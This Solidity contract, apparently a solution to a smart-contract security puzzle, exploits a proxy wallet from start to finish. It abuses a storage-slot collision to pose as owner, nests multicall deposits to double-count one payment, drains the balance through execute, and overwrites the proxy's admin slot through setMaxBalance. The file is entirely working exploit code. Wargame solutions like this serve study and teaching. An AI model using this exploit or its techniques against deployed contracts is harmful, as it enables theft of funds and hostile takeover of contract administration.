pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external; 
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletAttack {

    address proxy;

    constructor(address _proxy) public payable {
        proxy = _proxy;
    }

    function attack() public {
        // set storage slot 0, looks like owner to logic contract
        IPuzzleProxy(proxy).proposeNewAdmin(address(this));

        // this == owner now so can add to whitelist
        IPuzzleProxy(proxy).addToWhitelist(address(this));

        // create singleton byte array for multicall with deposit
        bytes[] memory depositSig = new bytes[](1);
        depositSig[0] = abi.encodeWithSignature("deposit()");

        bytes memory data = 
            abi.encodeWithSignature("multicall(bytes[])", depositSig);

        bytes[] memory doubleDeposit = new bytes[](2);
        doubleDeposit[0] = data;
        doubleDeposit[1] = data;

        // wrap two multicalls each containing a deposit to submit
        // to multicall, which will deposit twice since we only check
        // once in each multicall
        IPuzzleProxy(proxy).multicall{value: 0.001 ether}(doubleDeposit);

        // call execute to drain the contract
        IPuzzleProxy(proxy).execute(msg.sender, 0.002 ether, '');

        // now with proxy's balance == 0, can set maxBalance
        // this corresponds to storage slot 1 in proxy (admin)
        IPuzzleProxy(proxy).setMaxBalance(uint256(msg.sender));
    }

}
